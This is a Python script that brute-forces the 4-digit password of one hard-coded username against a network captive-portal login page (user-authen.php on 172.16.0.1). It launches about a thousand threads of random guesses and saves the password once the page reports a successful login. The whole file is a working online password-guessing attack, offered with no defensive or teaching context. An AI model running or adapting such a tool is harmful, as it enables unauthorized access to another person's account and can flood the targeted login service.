import requests, threading, time, random
reqs = requests.session()
class DIC:
    dictionarys = []
Dic = DIC()

username = 1911027
isConn = False

def randomNumber(main,length,Dic):
    x = main
    while(True):
        if len(Dic.dictionarys)==10**length:break
        if(len(main)==length):
            if main not in Dic.dictionarys:
                Dic.dictionarys.append(main)
                return main
            else:
                main = x
        main += random.choice("0123456789")
def result(x):
    df = open('result.txt', 'w')
    df.writelines(str(x))
    df.close()
def run():
    while(True):
        if isConn:break
        password = randomNumber("",4,Dic=Dic)
        print(f"count Password : ${len(Dic.dictionarys)}")
        url = "http://172.16.0.1/portal/user-authen.php"
        header = {
            "content-type":"application/x-www-form-urlencoded"
        }
        body = {
            "txtLogin":username,
            "txtPasswd":password,
            "btnLogin":"Login",
            "reqUrl":"",
            "reqCheck":"false"
        }
        try:
            res = reqs.post(url=url,headers=header,data=body)
            if "Login successfully" in res.text:
                print(f"Login successfully Password is ${password}")
                result(f'usename : {username}, password : ${password}')
        except:
            pass
for i in range(100):
    threading.Thread(target=run).start()
    threading.Thread(target=run).start()
    threading.Thread(target=run).start()
    threading.Thread(target=run).start()
    threading.Thread(target=run).start()
    threading.Thread(target=run).start()
    threading.Thread(target=run).start()
    threading.Thread(target=run).start()
    threading.Thread(target=run).start()
    threading.Thread(target=run).start()
